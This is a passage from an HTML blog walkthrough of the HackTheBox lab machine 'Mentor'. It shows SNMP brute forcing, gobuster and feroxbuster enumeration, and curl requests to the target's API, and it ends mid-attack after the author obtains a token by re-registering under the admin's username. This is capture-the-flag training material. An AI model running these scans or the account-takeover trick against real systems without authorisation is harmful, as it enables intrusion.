+</span></span></code></pre></td></tr></table></div></div><p>So, we see what appears to be an Ubuntu machine running kernel 5.15.0-56, along with some admin contact details, and the command line parameters passed to the kernel on boot.</p><p>We get a little information, but not enough. So I next attempted to brute force SNMP community strings with <code>nmap</code>, to see if any other strings existed providing us more information, or even allowing us to write (set) and gain further access to the machine:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$sudo</span> nmap -sU -p <span class=m>161</span> --script<span class=o>=</span>snmp-brute 10.10.11.193 --script-args<span class=o>=</span>snmp-brute.communitiesdb<span class=o>=</span>/home/zara/SecLists/Discovery/SNMP/common-snmp-community-strings.txt
+</span></span><span class=line><span class=cl>Starting Nmap 7.93 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2023-02-18 17:44 AEDT
+</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> mentorquotes.htb <span class=o>(</span>10.10.11.193<span class=o>)</span>
+</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.019s latency<span class=o>)</span>.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>PORT    STATE SERVICE
+</span></span><span class=line><span class=cl>161/udp open  snmp
+</span></span><span class=line><span class=cl><span class=p>|</span> snmp-brute: 
+</span></span><span class=line><span class=cl><span class=p>|</span>_  public - Valid credentials
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 7.46 seconds
+</span></span></code></pre></td></tr></table></div></div><p>We&rsquo;ve got an open port 80 that doesn&rsquo;t really respond, and some system information retrieved via SNMP, but unfortunately no other community strings. It was here, at the end of the weekend, I took a break frustrated and not knowing how to proceed.</p><p>I revisited this machine a few days later, and found it had been reset.. with the web server now accessible:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/2023-02-18-16-46-30-image.png data-srcset="./assets/2023-02-18-16-46-30-image.png, ./assets/2023-02-18-16-46-30-image.png 1.5x, ./assets/2023-02-18-16-46-30-image.png 2x" data-sizes=auto alt=./assets/2023-02-18-16-46-30-image.png title=./assets/2023-02-18-16-46-30-image.png></p><p>Looking around, it appeared the above was a static site only, with no user inputs we could submit from the browser.</p><p>Running <code>gobuster</code> again to see if any other URLs exist:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$gobuster</span> dir -u <span class=s2>&#34;http://mentorquotes.htb&#34;</span> -w /usr/share/dirb/wordlists/common.txt 
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span><span class=line><span class=cl>Gobuster v3.1.0
+</span></span><span class=line><span class=cl>by OJ Reeves <span class=o>(</span>@TheColonial<span class=o>)</span> <span class=p>&amp;</span> Christian Mehlmauer <span class=o>(</span>@firefart<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Url:                     http://mentorquotes.htb
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Method:                  GET
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Threads:                 <span class=m>10</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Wordlist:                /usr/share/dirb/wordlists/common.txt
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Negative Status codes:   <span class=m>404</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> User Agent:              gobuster/3.1.0
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Timeout:                 <span class=nv>10s</span>
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span><span class=line><span class=cl>2023/02/18 16:47:21 Starting gobuster in directory enumeration <span class=nv>mode</span>
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span><span class=line><span class=cl>/server-status        <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 281<span class=o>]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span><span class=line><span class=cl>2023/02/18 16:47:38 <span class=nv>Finished</span>
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span></code></pre></td></tr></table></div></div><p>So <code>/server-status</code> just gives us a forbidden error. Let&rsquo;s try a vhost scan (where our HTTP requests use the <code>Host</code> header), using the <code>-r</code> flag to follow redirects and remove false positives:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$gobuster</span> vhost -u <span class=s2>&#34;http://mentorquotes.htb&#34;</span> -w ~/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -r
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span><span class=line><span class=cl>Gobuster v3.1.0
+</span></span><span class=line><span class=cl>by OJ Reeves <span class=o>(</span>@TheColonial<span class=o>)</span> <span class=p>&amp;</span> Christian Mehlmauer <span class=o>(</span>@firefart<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Url:          http://mentorquotes.htb
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Method:       GET
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Threads:      <span class=m>10</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Wordlist:     /home/zara/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> User Agent:   gobuster/3.1.0
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Timeout:      <span class=nv>10s</span>
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span><span class=line><span class=cl>2023/02/18 17:01:21 Starting gobuster in VHOST enumeration <span class=nv>mode</span>
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span><span class=line><span class=cl>Found: api.mentorquotes.htb <span class=o>(</span>Status: 404<span class=o>)</span> <span class=o>[</span>Size: 22<span class=o>]</span>
+</span></span></code></pre></td></tr></table></div></div><p>If I hit the domain with <code>api.mentorquotes.htb</code> in the Host header:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$curl</span> -H <span class=s2>&#34;Host: api.mentorquotes.htb&#34;</span> -v http://mentorquotes.htb
+</span></span><span class=line><span class=cl>*   Trying 10.10.11.193:80...
+</span></span><span class=line><span class=cl>* Connected to mentorquotes.htb <span class=o>(</span>10.10.11.193<span class=o>)</span> port <span class=m>80</span> <span class=o>(</span><span class=c1>#0)</span>
+</span></span><span class=line><span class=cl>&gt; GET / HTTP/1.1
+</span></span><span class=line><span class=cl>&gt; Host: api.mentorquotes.htb
+</span></span><span class=line><span class=cl>&gt; User-Agent: curl/7.87.0
+</span></span><span class=line><span class=cl>&gt; Accept: */*
+</span></span><span class=line><span class=cl>&gt; 
+</span></span><span class=line><span class=cl>* Mark bundle as not supporting multiuse
+</span></span><span class=line><span class=cl>&lt; HTTP/1.1 <span class=m>404</span> Not Found
+</span></span><span class=line><span class=cl>&lt; Date: Sat, <span class=m>18</span> Feb <span class=m>2023</span> 06:06:05 GMT
+</span></span><span class=line><span class=cl>&lt; Server: uvicorn
+</span></span><span class=line><span class=cl>&lt; content-length: <span class=m>22</span>
+</span></span><span class=line><span class=cl>&lt; content-type: application/json
+</span></span><span class=line><span class=cl>&lt; 
+</span></span><span class=line><span class=cl>* Connection <span class=c1>#0 to host mentorquotes.htb left intact</span>
+</span></span><span class=line><span class=cl><span class=o>{</span><span class=s2>&#34;detail&#34;</span>:<span class=s2>&#34;Not Found&#34;</span><span class=o>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>So far, it seems like the machine is running Ubuntu with Linux kernel 5.15, and <a href=https://www.uvicorn.org/ target=_blank rel="noopener noreffer">Uvicorn</a> as the web server</p><p>If I hit <code>/server-status</code>, using the same Host header, the response indicates Apache 2.4.52:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$curl</span> -H <span class=s2>&#34;Host: api.mentorquotes.htb&#34;</span> -v http://mentorquotes.htb/server-status
+</span></span><span class=line><span class=cl>*   Trying 10.10.11.193:80...
+</span></span><span class=line><span class=cl>* Connected to mentorquotes.htb <span class=o>(</span>10.10.11.193<span class=o>)</span> port <span class=m>80</span> <span class=o>(</span><span class=c1>#0)</span>
+</span></span><span class=line><span class=cl>&gt; GET /server-status HTTP/1.1
+</span></span><span class=line><span class=cl>&gt; Host: api.mentorquotes.htb
+</span></span><span class=line><span class=cl>&gt; User-Agent: curl/7.87.0
+</span></span><span class=line><span class=cl>&gt; Accept: */*
+</span></span><span class=line><span class=cl>&gt; 
+</span></span><span class=line><span class=cl>* Mark bundle as not supporting multiuse
+</span></span><span class=line><span class=cl>&lt; HTTP/1.1 <span class=m>403</span> Forbidden
+</span></span><span class=line><span class=cl>&lt; Date: Sat, <span class=m>18</span> Feb <span class=m>2023</span> 06:13:15 GMT
+</span></span><span class=line><span class=cl>&lt; Server: Apache/2.4.52 <span class=o>(</span>Ubuntu<span class=o>)</span>
+</span></span><span class=line><span class=cl>&lt; Content-Length: <span class=m>285</span>
+</span></span><span class=line><span class=cl>&lt; Content-Type: text/html<span class=p>;</span> <span class=nv>charset</span><span class=o>=</span>iso-8859-1
+</span></span><span class=line><span class=cl>&lt; 
+</span></span><span class=line><span class=cl>&lt;!DOCTYPE HTML PUBLIC <span class=s2>&#34;-//IETF//DTD HTML 2.0//EN&#34;</span>&gt;
+</span></span><span class=line><span class=cl>&lt;html&gt;&lt;head&gt;
+</span></span><span class=line><span class=cl>&lt;title&gt;403 Forbidden&lt;/title&gt;
+</span></span><span class=line><span class=cl>&lt;/head&gt;&lt;body&gt;
+</span></span><span class=line><span class=cl>&lt;h1&gt;Forbidden&lt;/h1&gt;
+</span></span><span class=line><span class=cl>&lt;p&gt;You don<span class=err>&#39;</span>t have permission to access this resource.&lt;/p&gt;
+</span></span><span class=line><span class=cl>&lt;hr&gt;
+</span></span><span class=line><span class=cl>&lt;address&gt;Apache/2.4.52 <span class=o>(</span>Ubuntu<span class=o>)</span> Server at api.mentorquotes.htb Port 80&lt;/address&gt;
+</span></span><span class=line><span class=cl>&lt;/body&gt;&lt;/html&gt;
+</span></span><span class=line><span class=cl>* Connection <span class=c1>#0 to host mentorquotes.htb left intact</span>
+</span></span></code></pre></td></tr></table></div></div><p>While searching for &ldquo;enumerate uvicorn&rdquo;, I stumbled across this page from 0xdf on an old HTB machine named BackendTwo: <a href=https://0xdf.gitlab.io/2022/05/02/htb-backendtwo.html target=_blank rel="noopener noreffer">HTB: BackendTwo | 0xdf hacks stuff</a></p><p>I thought I would try <a href=https://github.com/epi052/feroxbuster target=_blank rel="noopener noreffer">feroxbuster</a>, a fast discovery tool written in Rust, with the same wordlist as 0xdf&rsquo;s walkthrough. We&rsquo;re basically enumerating URL paths similar to gobuster, while having the <code>Host: api.mentorquotes.htb</code> header set. We can pass the <code>-H</code> flag to <code>gobuster dir</code> to achieve the same, but sometimes it&rsquo;s nice to try out new things:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$feroxbuster</span> -u http://mentorquotes.htb -H <span class=s2>&#34;host: api.mentorquotes.htb&#34;</span> -w ~/SecLists/Discovery/Web-Content/raft-medium-directories.txt 
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl> ___  ___  __   __     __      __         __   ___
+</span></span><span class=line><span class=cl><span class=p>|</span>__  <span class=p>|</span>__  <span class=p>|</span>__<span class=o>)</span> <span class=p>|</span>__<span class=o>)</span> <span class=p>|</span> /  <span class=sb>`</span>    /  <span class=se>\ \_</span>/ <span class=p>|</span> <span class=p>|</span>  <span class=se>\ </span><span class=p>|</span>__
+</span></span><span class=line><span class=cl><span class=p>|</span>    <span class=p>|</span>___ <span class=p>|</span>  <span class=se>\ </span><span class=p>|</span>  <span class=se>\ </span><span class=p>|</span> <span class=se>\_</span>_,    <span class=se>\_</span>_/ / <span class=se>\ </span><span class=p>|</span> <span class=p>|</span>__/ <span class=p>|</span>___
+</span></span><span class=line><span class=cl>by Ben <span class=s2>&#34;epi&#34;</span> Risher 🤓                 ver: 2.3.3
+</span></span><span class=line><span class=cl>───────────────────────────┬──────────────────────
+</span></span><span class=line><span class=cl> 🎯  Target Url            │ http://mentorquotes.htb
+</span></span><span class=line><span class=cl> 🚀  Threads               │ <span class=m>50</span>
+</span></span><span class=line><span class=cl> 📖  Wordlist              │ /home/zara/SecLists/Discovery/Web-Content/raft-medium-directories.txt
+</span></span><span class=line><span class=cl> 👌  Status Codes          │ <span class=o>[</span>200, 204, 301, 302, 307, 308, 401, 403, 405, 500<span class=o>]</span>
+</span></span><span class=line><span class=cl> 💥  Timeout <span class=o>(</span>secs<span class=o>)</span>        │ <span class=m>7</span>
+</span></span><span class=line><span class=cl> 🦡  User-Agent            │ feroxbuster/2.3.3
+</span></span><span class=line><span class=cl> 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+</span></span><span class=line><span class=cl> 🤯  Header                │ host:  api.mentorquotes.htb
+</span></span><span class=line><span class=cl> 🔃  Recursion Depth       │ <span class=m>4</span>
+</span></span><span class=line><span class=cl>───────────────────────────┴──────────────────────
+</span></span><span class=line><span class=cl> 🏁  Press <span class=o>[</span>ENTER<span class=o>]</span> to use the Scan Cancel Menu™
+</span></span><span class=line><span class=cl>──────────────────────────────────────────────────
+</span></span><span class=line><span class=cl><span class=m>307</span>        0l        0w        0c http://mentorquotes.htb/admin
+</span></span><span class=line><span class=cl><span class=m>200</span>       31l       62w      969c http://mentorquotes.htb/docs
+</span></span><span class=line><span class=cl><span class=m>307</span>        0l        0w        0c http://mentorquotes.htb/users
+</span></span><span class=line><span class=cl><span class=m>307</span>        0l        0w        0c http://mentorquotes.htb/quotes
+</span></span><span class=line><span class=cl><span class=m>403</span>        9l       28w      285c http://mentorquotes.htb/server-status
+</span></span></code></pre></td></tr></table></div></div><p>If we <code>curl -H "Host: api.mentorquotes.htb" http://mentorquotes.htb/docs</code>, we see a <a href=https://swagger.io/tools/swagger-ui/ target=_blank rel="noopener noreffer">swagger-ui</a> interface. Rather than pasting boring and unreadable curl output, I installed the <a href=https://addons.mozilla.org/en-US/firefox/addon/modify-header-value/ target=_blank rel="noopener noreffer">Modify Header Value</a> extension for Firefox, which allows you to create domain based rules for custom HTTP headers. So I set <code>Host: api.mentorquotes.htb</code> and browsing to <a href=http://mentorquotes.htb/docs target=_blank rel="noopener noreffer">http://mentorquotes.htb/docs</a> , we get the following swagger UI:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/2023-02-18-19-47-58-image.png data-srcset="./assets/2023-02-18-19-47-58-image.png, ./assets/2023-02-18-19-47-58-image.png 1.5x, ./assets/2023-02-18-19-47-58-image.png 2x" data-sizes=auto alt=./assets/2023-02-18-19-47-58-image.png title=./assets/2023-02-18-19-47-58-image.png></p><h2 id=foothold>Foothold</h2><p>Given the helpful swagger UI above, we&rsquo;ve gone some distance with enumeration, can we gain more access via the API?
+I POSTed to <code>/auth/signup</code> in order to create an account, which gave me a 201 (created) response:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>{
+</span></span><span class=line><span class=cl>  &#34;email&#34;: &#34;foo@bar.com&#34;,
+</span></span><span class=line><span class=cl>  &#34;username&#34;: &#34;foobar&#34;,
+</span></span><span class=line><span class=cl>  &#34;password&#34;: &#34;foobarbaz&#34;
+</span></span><span class=line><span class=cl>}
+</span></span></code></pre></td></tr></table></div></div><p>Now, logging in &ndash; I adapted the <code>curl</code> command swagger UI generates, adding in the <code>Host</code> header:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$curl</span> -X <span class=s1>&#39;POST&#39;</span>   <span class=s1>&#39;http://mentorquotes.htb/auth/login&#39;</span>   -H <span class=s1>&#39;accept: application/json&#39;</span>   -H <span class=s1>&#39;Content-Type: application/json&#39;</span> -H <span class=s1>&#39;Host: api.mentorquotes.htb&#39;</span>   -d <span class=s1>&#39;{
+</span></span></span><span class=line><span class=cl><span class=s1>  &#34;email&#34;: &#34;foo@bar.com&#34;,
+</span></span></span><span class=line><span class=cl><span class=s1>  &#34;username&#34;: &#34;foobar&#34;,
+</span></span></span><span class=line><span class=cl><span class=s1>  &#34;password&#34;: &#34;foobarbaz&#34;
+</span></span></span><span class=line><span class=cl><span class=s1>}&#39;</span>
+</span></span><span class=line><span class=cl><span class=s2>&#34;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImZvb2JhciIsImVtYWlsIjoiZm9vQGJhci5jb20ifQ.Q2yx8BqrikpPRF6hVz1BTgOLvzUODVUW0FvcsrYfBhs&#34;</span>
+</span></span></code></pre></td></tr></table></div></div><p>We get a JWT back for our session. I tried using the JWT in the Authorization header field to get users from within BurpSuite:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>GET /users/ HTTP/1.1
+</span></span><span class=line><span class=cl>Host: api.mentorquotes.htb
+</span></span><span class=line><span class=cl>User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
+</span></span><span class=line><span class=cl>Accept: application/json
+</span></span><span class=line><span class=cl>Accept-Language: en-US,en;q=0.5
+</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate
+</span></span><span class=line><span class=cl>Referer: http://api.mentorquotes.htb/users/4
+</span></span><span class=line><span class=cl>Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImZvb2JhciIsImVtYWlsIjoiZm9vQGJhci5jb20ifQ.Q2yx8BqrikpPRF6hVz1BTgOLvzUODVUW0FvcsrYfBhs
+</span></span><span class=line><span class=cl>DNT: 1
+</span></span><span class=line><span class=cl>Connection: close
+</span></span></code></pre></td></tr></table></div></div><p>Okay, it appears our JWT works, but we obviously don&rsquo;t have the required admin privilege:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>HTTP/1.1 403 Forbidden
+</span></span><span class=line><span class=cl>Date: Sun, 19 Feb 2023 06:03:27 GMT
+</span></span><span class=line><span class=cl>Server: uvicorn
+</span></span><span class=line><span class=cl>content-length: 54
+</span></span><span class=line><span class=cl>content-type: application/json
+</span></span><span class=line><span class=cl>Connection: close
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>{&#34;detail&#34;:&#34;Only admin users can access this resource&#34;}
+</span></span></code></pre></td></tr></table></div></div><p>The top of the OpenAPI spec at <a href=http://api.mentorquotes.htb/openapi.json target=_blank rel="noopener noreffer">http://api.mentorquotes.htb/openapi.json</a> shows a contact named <code>james</code> with email <code>james@mentorquotes.htb</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl>    <span class=s2>&#34;contact&#34;</span><span class=err>:</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>      <span class=nt>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;james&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>      <span class=nt>&#34;url&#34;</span><span class=p>:</span> <span class=s2>&#34;http://mentorquotes.htb&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>      <span class=nt>&#34;email&#34;</span><span class=p>:</span> <span class=s2>&#34;james@mentorquotes.htb&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span><span class=err>,</span>
+</span></span></code></pre></td></tr></table></div></div><p>I tried a few things here, such as signing up again, but passing <code>"admin": true</code> in the signup JSON payload and a few other variations to see if I could force the creation of an administrator account. I wasn&rsquo;t successful however.</p><p>Next I wondered if we could clobber this account by creating it again? This was working off the assumption the signup endpoint will do an upsert on the underlying database (so if the data already exists, it will update over the top of the existing record), and perhaps the existing user has a role in a separate table &ndash; so signing up will retain their admin permissions.. Maybe.. Hopefully..</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>POST /auth/signup HTTP/1.1
+</span></span><span class=line><span class=cl>Host: api.mentorquotes.htb
+</span></span><span class=line><span class=cl>User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
+</span></span><span class=line><span class=cl>Accept: application/json
+</span></span><span class=line><span class=cl>Accept-Language: en-US,en;q=0.5
+</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate
+</span></span><span class=line><span class=cl>Referer: http://api.mentorquotes.htb/docs
+</span></span><span class=line><span class=cl>Content-Type: application/json
+</span></span><span class=line><span class=cl>Origin: http://api.mentorquotes.htb
+</span></span><span class=line><span class=cl>Content-Length: 89
+</span></span><span class=line><span class=cl>DNT: 1
+</span></span><span class=line><span class=cl>Connection: close
+</span></span><span class=line><span class=cl>Pragma: no-cache
+</span></span><span class=line><span class=cl>Cache-Control: no-cache
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>{
+</span></span><span class=line><span class=cl>  &#34;email&#34;: &#34;james2@mentorquotes.htb&#34;,
+</span></span><span class=line><span class=cl>  &#34;username&#34;: &#34;james&#34;,
+</span></span><span class=line><span class=cl>  &#34;password&#34;: &#34;foobarbaz&#34;
+</span></span><span class=line><span class=cl>}
+</span></span></code></pre></td></tr></table></div></div><p>This gave a 201 (created) response, so we try logging in, and we get a token!:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>POST /auth/login HTTP/1.1
+</span></span><span class=line><span class=cl>Host: api.mentorquotes.htb
+</span></span><span class=line><span class=cl>User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
+</span></span><span class=line><span class=cl>Accept: application/json
+</span></span><span class=line><span class=cl>Accept-Language: en-US,en;q=0.5
+</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate
+</span></span><span class=line><span class=cl>Referer: http://mentorquotes.htb/docs
+</span></span><span class=line><span class=cl>Content-Type: application/json
+</span></span><span class=line><span class=cl>Origin: http://mentorquotes.htb
+</span></span><span class=line><span class=cl>Content-Length: 90
+</span></span><span class=line><span class=cl>DNT: 1
+</span></span><span class=line><span class=cl>Connection: close
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>{
+</span></span><span class=line><span class=cl>  &#34;email&#34;: &#34;james2@mentorquotes.htb&#34;,
+</span></span><span class=line><span class=cl>  &#34;username&#34;: &#34;james&#34;,
+</span></span><span class=line><span class=cl>  &#34;password&#34; :&#34;foobarbaz&#34;
+</span></span><span class=line><span class=cl>}
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
